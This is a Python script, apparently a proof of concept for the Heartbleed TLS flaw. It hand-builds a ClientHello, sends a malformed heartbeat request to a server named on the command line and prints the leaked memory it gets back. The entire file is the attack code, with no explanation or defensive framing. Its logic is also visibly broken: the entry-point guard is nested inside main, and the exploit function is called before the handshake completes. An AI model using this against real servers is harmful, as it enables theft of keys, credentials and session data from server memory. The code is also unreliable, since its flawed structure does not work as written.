import sys
import socket
import struct
import select
import array

clientHello = (
    0x16,
    0x03, 0x03,
    0x00, 0x2f,
    0x01,
    0x00, 0x00, 0x2b,
    0x03, 0x03,

    0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x00, 0x01,
    0x02, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x03, 0x04,
    0x05, 0x06, 0x07, 0x08, 0x09, 0x12, 0x13, 0x14, 0x15, 0x16,
    0x17, 0x18,

    0x00,
    0x00, 0x02,
    0x00, 0x2f,
    0x01, 0x00,
    0x00, 0x00,
)


def recv_all(socket, lenght):
    response = b''
    total_bytes_remaining = lenght
    while total_bytes_remaining > 0:
        readable, writable, error = select.select([socket], [], [])
        if socket in readable:
            data = socket.recv(total_bytes_remaining)
            response += data
            total_bytes_remaining -= len(data)
    return response


def readPacket(socket):
    headerLenght = 6
    payload = b''
    header = recv_all(socket, headerLenght)
    print(header.hex(" "))
    if header != b'':
        type, version, lenght, msgType = struct.unpack('>BHHB', header)
        if lenght > 0:
            payload += recv_all(socket, lenght - 1)
    else:
        print("Response has no header")
    return type, version, payload, msgType


heartbeat = (
    0x18,
    0x03, 0x03,
    0x00, 0x03,
    0x01,
    0x00, 0x40
)

SERVER_HELLO_DONE = 14


def readServerBeat(socket):
    payload = b''
    for i in range(0, 4):
        type, version, packet_payload, msgType = readPacket(socket)
        payload += packet_payload
    return (type, version, payload, msgType)


def exploit(socket):
    HEART_BEAT_RESPONSE = 21
    payload = b''
    socket.send(array.array('B', heartbeat))
    print("Sent Heartbeat ")
    type, version, payload, msgType = readServerBeat(socket)
    if msgType == HEART_BEAT_RESPONSE:
        print(payload.decode('utf-8'))
    else:
        print("No heartbeat received")
    socket.close()


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], 443))
    s.send(array.array('B', clientHello))
    serverHelloDone = False
    while not serverHelloDone:
        type, version, payload, msgType = readPacket(s)
        if(msgType == SERVER_HELLO_DONE):
            serverHelloDone = True
        exploit(s)
    if __name__ == '__main__':
        main()